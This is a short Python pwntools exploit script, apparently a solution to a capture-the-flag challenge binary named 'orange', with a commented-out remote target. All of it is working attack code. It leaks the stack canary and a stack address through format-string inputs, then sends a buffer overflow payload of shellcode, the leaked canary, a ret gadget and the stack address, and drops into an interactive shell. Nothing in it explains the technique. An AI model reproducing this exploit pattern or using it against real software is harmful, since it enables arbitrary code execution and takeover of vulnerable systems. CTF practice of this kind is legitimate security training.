from pwn import *
 
context.update(arch='x86_64', os='linux') #o tym pamietac jak sie nie pobiera danych z pliku
elf = ELF("./orange")
io = elf.process()
#io = remote("orange.uctf.ir", 5001)

io.sendlineafter("Enter your name: ", b"%37$lx")
io.sendlineafter("Enter your choice: ", "3")
io.sendlineafter("Enter the number of oranges you want to buy: ", "1")
io.sendlineafter("Enter your choice: ", "1")
io.recvuntil("Buyer: ")
canary = int(io.recvline().strip(),16)
log.success(f"canary : {hex(canary)}")

io.sendlineafter("Enter your choice: ", "5")
io.sendlineafter("Enter your name: ", b"%7$lx")
io.sendlineafter("Enter your choice: ", "1")
io.recvuntil("Buyer: ")
stack = int(io.recvline().strip(),16) + 0x10
log.success(f"stack : {hex(stack)}")
rop = ROP(elf)
RET = rop.find_gadget(['ret'])[0]

io.sendlineafter("Enter your choice: ", "5")
shellcode = asm(shellcraft.sh())

payload = flat(
  shellcode,
  b"A"*(104-len(shellcode)),
  p64(canary),
  p64(RET),
  p64(stack)
)



io.sendlineafter("Enter your name: ", payload)
#io.sendlineafter("Enter your choice: ", "6")

# Attach GDB to the running process
#gdb.attach(io, gdbscript="""
#init-pwndbg
#canary
#""")
# Keep the process alive to interact with GDB
io.interactive()
